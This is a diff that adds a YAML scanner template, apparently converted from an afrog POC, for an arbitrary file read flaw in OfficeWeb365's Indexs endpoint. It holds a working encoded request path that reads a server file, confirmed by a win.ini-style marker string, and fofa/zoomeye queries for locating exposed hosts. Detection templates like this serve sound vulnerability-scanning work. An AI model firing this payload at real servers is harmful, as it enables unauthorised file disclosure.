@@ -1,0 +1,29 @@
+# 来源: afrog（转换自 afrog/xray 表达式 POC）
+http:
+  - matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - for 16-bit app support
+        condition: and
+    method: GET
+    path:
+      - '{{BaseURL}}/Pic/Indexs?imgs=DJwkiEm6KXJZ7aEiGyN4Cz83Kn1PLaKA09'
+id: office365-indexs-fileread
+info:
+  author: zan8in
+  description: |
+    officeWeb365 Indexs接口存在任意文件读取
+    fofa: body="请输入furl参数" || header="OfficeWeb365" || banner="OfficeWeb365"
+    zoomeye: app:"OfficeWeb365"
+  metadata:
+    argus-execution-class: detection
+    argus-import-license: MIT License
+    argus-import-source: afrog
+    argus-risk-level: high
+  name: officeWeb365 Indexs接口存在任意文件读取
+  severity: high
+  tags: office365,fileread,argus-import
